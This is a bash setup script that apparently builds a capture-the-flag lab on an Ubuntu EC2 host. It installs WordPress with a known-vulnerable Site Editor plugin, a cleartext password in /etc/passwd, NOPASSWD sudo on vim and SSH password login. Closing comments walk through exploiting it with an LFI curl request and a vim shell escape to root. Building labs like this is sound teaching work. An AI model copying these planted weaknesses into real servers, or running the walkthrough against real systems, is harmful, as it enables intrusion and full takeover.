#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Run this as root"
    exit
fi
read -p 'enter ec2 instance DNS name: ' dnsname
password="w0rdpr355I54ann0y1NG"

updateUbuntu(){
	sudo apt update > /dev/null 2>&1
	sudo apt install  apache2 \
                 ghostscript \
                 libapache2-mod-php \
                 mysql-server \
                 php \
                 php-bcmath \
                 php-curl \
                 php-imagick \
                 php-intl \
                 php-json \
                 php-mbstring \
                 php-mysql \
                 php-xml \
                 php-zip \
                 unzip  --yes > /dev/null 2>&1
}

phpUpdate(){
	sudo sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/8.1/apache2/php.ini
}
makeWWW(){
	sudo mkdir -p /srv/www
	sudo chown www-data: /srv/www
	wget https://wordpress.org/latest.tar.gz >/dev/null 2>&1
	sudo -u www-data tar zx -f latest.tar.gz -C /srv/www 
	sudo echo '<VirtualHost *:80>
    	DocumentRoot /srv/www/wordpress
    	<Directory /srv/www/wordpress>
        	Options FollowSymLinks
        	AllowOverride Limit Options FileInfo
        	DirectoryIndex index.php
        	Require all granted
    	</Directory>
    	<Directory /srv/www/wordpress/wp-content>
        	Options FollowSymLinks
        	Require all granted
    	</Directory>
		</VirtualHost>' > /etc/apache2/sites-available/wordpress.conf
}

mysqlStuff(){
	sudo mysql --user=root --execute="CREATE DATABASE wordpress;"
	sudo mysql --user=root --execute="CREATE USER wordpress@localhost IDENTIFIED BY 'w0rdpr355I54ann0y1NG';"
	sudo mysql --user=root --execute=" GRANT ALL PRIVILEGES ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES"
	sudo service mysql start 1>/dev/null
}

wordPress(){
	sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i "s/password_here/$password/" /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i -e '$adefine("WP_MEMORY_LIMIT", "256M");' /srv/www/wordpress/wp-config.php 
	sudo a2ensite wordpress 1>/dev/null
	sudo a2enmod rewrite 1>/dev/null
	sudo a2dissite 000-default 1>/dev/null
	sudo service apache2 reload 1>/dev/null
}

moreWordpress(){
	cd /srv/www/wordpress/wp-content/plugins
	sudo wget https://www.exploit-db.com/apps/5be8270e880c445e11c59597497468bb-site-editor.zip >/dev/null 2>&1
	sudo unzip *.zip 1>/dev/null
	rm *.zip
	cd /tmp;sudo curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
	sudo chmod +x wp-cli.phar
	sudo mv wp-cli.phar /usr/local/bin/wp
	cd /srv/www/wordpress/
	sudo -u www-data wp core install --url=$dnsname --title=SuperRealSite --admin_user=jeff --admin_email='jeff@localhost.com' 1>/root/wordpressadmin.txt
	sleep 2
	sudo -u www-data wp plugin activate site-editor

}

userStuff(){
	sudo useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
	sudo echo "steve ALL=(root) NOPASSWD: /usr/bin/vim" >> /etc/sudoers
	sudo sed -i 's/1001:100:/1001:100:w0rdpr355I54ann0y1NG/' /etc/passwd
	sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
	sudo systemctl reload sshd
	sudo echo -ne "$dnsname root"|sha256sum > /root/proof.txt
	sudo echo -ne "$dnsname local"|md5sum > /home/steve/local.txt

}

printf "\n\033[33;1mupdating/installing software\033[0m\n"
updateUbuntu 
printf "\n\033[33;1mmaking directories\033[0m\n"
makeWWW
printf "\n\033[33;1mconfiguring mysql\033[0m\n"
mysqlStuff
printf "\n\033[33;1minstalling wordpress\033[0m\n"
wordPress
printf "\n\033[33;1mchanging php.ini\033[0m\n"
phpUpdate
printf "\n\033[33;1mactivate wordpress/install plugins/update database\033[0m\n"
moreWordpress
printf "\n\033[33;1mcreate user/set sudo and ssh permissions\033[0m\n"
userStuff

#make sure ubuntu and kali are on same network/vpc
#make sure kali allows 445 inbound
###############

# Walkthrough
# nmap -sCV from internal IP finds 22/80
# wpscan --url http://ec2-3-144-231-183.us-east-2.compute.amazonaws.com --plugins-detection aggressive
# finds site-editor plugin
# LFI on plugin /etc/passwd finds cleartext password
# curl http:// site /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
# ssh
# sudo -l finds vim usage
# sudo vim -c ':!/bin/sh'